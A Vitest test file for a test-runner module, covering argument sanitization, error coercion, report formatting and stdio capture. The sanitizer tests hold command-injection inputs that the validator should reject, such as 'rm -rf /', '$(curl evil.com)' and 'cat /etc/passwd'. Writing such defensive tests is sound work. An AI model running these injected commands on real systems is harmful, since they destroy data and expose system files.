import { Writable } from "node:stream";
import { describe, expect, it } from "vitest";
import {
	coerceErrors,
	formatReportJson,
	formatReportMarkdown,
	sanitizeTestArgs,
	withStdioCaptured,
} from "./run-tests.js";

describe("sanitizeTestArgs", () => {
	it("allows file paths", () => {
		expect(sanitizeTestArgs(["src/index.test.ts"])).toEqual(["src/index.test.ts"]);
	});

	it("allows --project flag", () => {
		expect(sanitizeTestArgs(["--project", "core"])).toEqual(["--project", "core"]);
	});

	it("rejects command injection via semicolons", () => {
		expect(() => sanitizeTestArgs(["src/test.ts; rm -rf /"])).toThrow();
	});

	it("rejects command injection via backticks", () => {
		expect(() => sanitizeTestArgs(["`whoami`"])).toThrow();
	});

	it("rejects command injection via $() substitution", () => {
		expect(() => sanitizeTestArgs(["$(curl evil.com)"])).toThrow();
	});

	it("rejects pipe characters", () => {
		expect(() => sanitizeTestArgs(["test.ts | cat /etc/passwd"])).toThrow();
	});

	it("allows relative paths with slashes and dots", () => {
		expect(sanitizeTestArgs(["./packages/reporter/src/utils/ansi.test.ts"])).toEqual([
			"./packages/reporter/src/utils/ansi.test.ts",
		]);
	});
});

describe("coerceErrors", () => {
	it("extracts message from Error-like objects", () => {
		const result = coerceErrors([new Error("boom")]);
		expect(result).toHaveLength(1);
		expect(result[0].message).toBe("boom");
	});

	it("uses stacks array when present", () => {
		const result = coerceErrors([{ message: "fail", stacks: ["frame1", "frame2"] }]);
		expect(result[0].stacks).toEqual(["frame1", "frame2"]);
	});

	it("wraps stack string into stacks array", () => {
		const result = coerceErrors([{ message: "fail", stack: "at foo:1:1" }]);
		expect(result[0].stacks).toEqual(["at foo:1:1"]);
	});

	it("prefers stacks over stack when both are present", () => {
		const result = coerceErrors([{ message: "fail", stacks: ["frame1"], stack: "ignored" }]);
		expect(result[0].stacks).toEqual(["frame1"]);
	});

	it("converts non-object values to string messages", () => {
		const result = coerceErrors(["string error", 42, null]);
		expect(result[0].message).toBe("string error");
		expect(result[1].message).toBe("42");
		expect(result[2].message).toBe("null");
	});

	it("returns empty array for empty input", () => {
		expect(coerceErrors([])).toEqual([]);
	});
});

describe("formatReportMarkdown", () => {
	it("formats a passing report", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "passed" as const,
			summary: { total: 3, passed: 3, failed: 0, skipped: 0, duration: 150 },
			failed: [],
			unhandledErrors: [],
			failedFiles: [],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("3 passed");
		expect(md).toContain("150ms");
		expect(md).not.toContain("failed");
	});

	it("formats a failing report with errors", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "failed" as const,
			summary: { total: 2, passed: 1, failed: 1, skipped: 0, duration: 200 },
			failed: [
				{
					file: "src/math.test.ts",
					state: "failed" as const,
					duration: 50,
					tests: [
						{
							name: "adds numbers",
							fullName: "Math > adds numbers",
							state: "failed" as const,
							duration: 10,
							errors: [{ message: "expected 3 to equal 4", diff: "- 3\n+ 4" }],
						},
					],
				},
			],
			unhandledErrors: [],
			failedFiles: ["src/math.test.ts"],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("1 failed");
		expect(md).toContain("1 passed");
		expect(md).toContain("src/math.test.ts");
		expect(md).toContain("Math > adds numbers");
		expect(md).toContain("expected 3 to equal 4");
		expect(md).toContain("diff");
	});

	it("includes project name when present", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			project: "my-lib",
			reason: "passed" as const,
			summary: { total: 1, passed: 1, failed: 0, skipped: 0, duration: 10 },
			failed: [],
			unhandledErrors: [],
			failedFiles: [],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("Project: my-lib");
	});

	it("formats unhandled errors", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "failed" as const,
			summary: { total: 0, passed: 0, failed: 0, skipped: 0, duration: 0 },
			failed: [],
			unhandledErrors: [{ message: "global crash", stack: "at top-level" }],
			failedFiles: [],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("Unhandled Errors");
		expect(md).toContain("global crash");
		expect(md).toContain("at top-level");
	});

	it("shows skipped count when present", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "passed" as const,
			summary: { total: 5, passed: 3, failed: 0, skipped: 2, duration: 100 },
			failed: [],
			unhandledErrors: [],
			failedFiles: [],
		};

		const md = formatReportMarkdown(report);
		expect(md).toContain("2 skipped");
	});

	// The headline tokens below are a contract with
	// plugin/hooks/post-tool-use-tdd-artifact.sh, which classifies
	// MCP run_tests results into test_passed_run / test_failed_run
	// tdd_artifacts rows by grepping the first line of the response
	// for `## ✅ Vitest` or `## ❌ Vitest`. If this format changes,
	// the hook regex must change too — otherwise every failing run
	// is silently recorded as a pass.
	it("emits the pass headline the post-tool-use hook classifies on", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "passed" as const,
			summary: { total: 3, passed: 3, failed: 0, skipped: 0, duration: 42 },
			failed: [],
			unhandledErrors: [],
			failedFiles: [],
		};
		const firstLine = formatReportMarkdown(report).split("\n", 1)[0];
		expect(firstLine).toMatch(/^##\s+✅\s+Vitest/);
	});

	it("emits the fail headline the post-tool-use hook classifies on", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "failed" as const,
			summary: { total: 2, passed: 1, failed: 1, skipped: 0, duration: 42 },
			failed: [],
			unhandledErrors: [],
			failedFiles: ["src/x.test.ts"],
		};
		const firstLine = formatReportMarkdown(report).split("\n", 1)[0];
		expect(firstLine).toMatch(/^##\s+❌\s+Vitest/);
	});
});

describe("formatReportJson", () => {
	const baseReport = {
		timestamp: "2026-01-01T00:00:00.000Z",
		reason: "passed" as const,
		summary: { total: 1, passed: 1, failed: 0, skipped: 0, duration: 10 },
		failed: [],
		unhandledErrors: [],
		failedFiles: [],
	};

	it("returns the report under a `report` key", () => {
		const parsed = JSON.parse(formatReportJson(baseReport));
		expect(parsed.report).toEqual(baseReport);
	});

	it("omits classifications when none are provided", () => {
		const parsed = JSON.parse(formatReportJson(baseReport));
		expect(parsed.classifications).toBeUndefined();
	});

	it("serializes classifications as a plain object", () => {
		const classifications = new Map<string, string>([
			["Math > adds", "stable"],
			["Math > subs", "new-failure"],
		]);
		const parsed = JSON.parse(formatReportJson(baseReport, classifications));
		expect(parsed.classifications).toEqual({
			"Math > adds": "stable",
			"Math > subs": "new-failure",
		});
	});

	it("produces parseable JSON for a failing report", () => {
		const report = {
			timestamp: "2026-01-01T00:00:00.000Z",
			reason: "failed" as const,
			summary: { total: 2, passed: 1, failed: 1, skipped: 0, duration: 200 },
			failed: [
				{
					file: "src/math.test.ts",
					state: "failed" as const,
					duration: 50,
					tests: [
						{
							name: "adds numbers",
							fullName: "Math > adds numbers",
							state: "failed" as const,
							duration: 10,
							errors: [{ message: "expected 3 to equal 4", diff: "- 3\n+ 4" }],
						},
					],
				},
			],
			unhandledErrors: [],
			failedFiles: ["src/math.test.ts"],
		};
		const parsed = JSON.parse(formatReportJson(report));
		expect(parsed.report.summary.failed).toBe(1);
		expect(parsed.report.failed[0].file).toBe("src/math.test.ts");
		expect(parsed.report.failed[0].tests[0].errors[0].diff).toBe("- 3\n+ 4");
	});
});

describe("withStdioCaptured", () => {
	const collectInto = () => {
		const chunks: string[] = [];
		const sink = new Writable({
			write(chunk, _encoding, cb) {
				chunks.push(chunk.toString("utf8"));
				cb();
			},
		});
		return { chunks, sink };
	};

	it("redirects process.stdout.write to the supplied sink during fn", async () => {
		const { chunks, sink } = collectInto();
		await withStdioCaptured(sink, async () => {
			process.stdout.write("hello-from-stdout");
		});
		expect(chunks.join("")).toContain("hello-from-stdout");
	});

	it("redirects process.stderr.write to the supplied sink during fn", async () => {
		const { chunks, sink } = collectInto();
		await withStdioCaptured(sink, async () => {
			process.stderr.write("hello-from-stderr");
		});
		expect(chunks.join("")).toContain("hello-from-stderr");
	});

	it("restores the original process.stdout.write after fn resolves", async () => {
		const original = process.stdout.write;
		const { sink } = collectInto();
		await withStdioCaptured(sink, async () => {
			expect(process.stdout.write).not.toBe(original);
		});
		expect(process.stdout.write).toBe(original);
	});

	it("restores the original process.stderr.write after fn resolves", async () => {
		const original = process.stderr.write;
		const { sink } = collectInto();
		await withStdioCaptured(sink, async () => {
			expect(process.stderr.write).not.toBe(original);
		});
		expect(process.stderr.write).toBe(original);
	});

	it("restores process.stdout.write and process.stderr.write after fn rejects", async () => {
		const originalStdout = process.stdout.write;
		const originalStderr = process.stderr.write;
		const { sink } = collectInto();
		await expect(
			withStdioCaptured(sink, async () => {
				throw new Error("boom");
			}),
		).rejects.toThrow("boom");
		expect(process.stdout.write).toBe(originalStdout);
		expect(process.stderr.write).toBe(originalStderr);
	});

	it("returns the value resolved by fn", async () => {
		const { sink } = collectInto();
		const result = await withStdioCaptured(sink, async () => 42);
		expect(result).toBe(42);
	});
});
